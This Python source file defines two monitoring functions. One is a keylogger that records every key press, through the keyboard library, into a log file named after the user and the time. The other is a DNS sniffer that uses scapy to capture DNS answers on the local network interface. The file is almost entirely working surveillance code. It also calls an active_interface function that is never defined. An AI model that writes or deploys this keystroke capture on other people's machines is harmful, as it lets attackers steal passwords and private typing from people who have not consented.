from utilities import current_time, user_name, log_console
import logging
import keyboard
import scapy.all as scapy
import sys

def setup_logger(log_filename, logger_name):
    logger = logging.getLogger(logger_name)
    logger.setLevel(logging.INFO)
    handler = logging.FileHandler(log_filename, mode='a')
    formatter = logging.Formatter('%(asctime)s: %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
    handler.setFormatter(formatter)
    if not logger.hasHandlers():
        logger.addHandler(handler)
    return logger

def key_logger():
    """
    Starts the key logger and writes keystrokes to a uniquely named log file.
    """
    log_console("Key Logger started and running...", "INFO")
    log_filename = f"keylog-{user_name()}_{current_time()}.txt"
    logger = setup_logger(log_filename, "KeyLogger")

    def on_key_press(event):
        key = event.name
        logger.info(key)

    keyboard.on_press(on_key_press)
    try:
        keyboard.wait()
    except KeyboardInterrupt:
        print("Key Logger stopped by user.")
        sys.exit(0)
    except Exception as e:
        print(f"Key Logger error: {e}")
        sys.exit(1)

def dns_logger():
    """
    Starts the DNS logger and writes DNS queries to a uniquely named log file.
    """
    print("DNS Query Logger started and running...\n")
    log_filename = f"dnslog-{user_name()}_{current_time()}.txt"
    logger = setup_logger(log_filename, "DNSLogger")

    def process_packet(packet):
        if packet.haslayer(scapy.DNS) and packet[scapy.DNS].qr == 1:
            if packet[scapy.DNS].an is not None:
                answers = packet[scapy.DNS].an
                if not isinstance(answers, list) and not hasattr(answers, '__iter__'):
                    answers = [answers]
                for answer in answers:
                    try:
                        domain = answer.rrname.decode('utf-8')
                        if answer.type == 1:  # A record
                            ip = answer.rdata
                            logger.info(f'A record: {domain} -> {ip}')
                        elif answer.type == 28:  # AAAA record
                            ip = answer.rdata
                            logger.info(f'AAAA record: {domain} -> {ip}')
                    except Exception as e:
                        logger.error(f"Error processing DNS answer: {e}")

    try:
        iface = active_interface()
        scapy.sniff(iface=iface, store=False, prn=process_packet)
    except KeyboardInterrupt:
        print("DNS Logger stopped by user.")
        sys.exit(0)
    except Exception as e:
        print(f"DNS Logger error: {e}")
        sys.exit(1)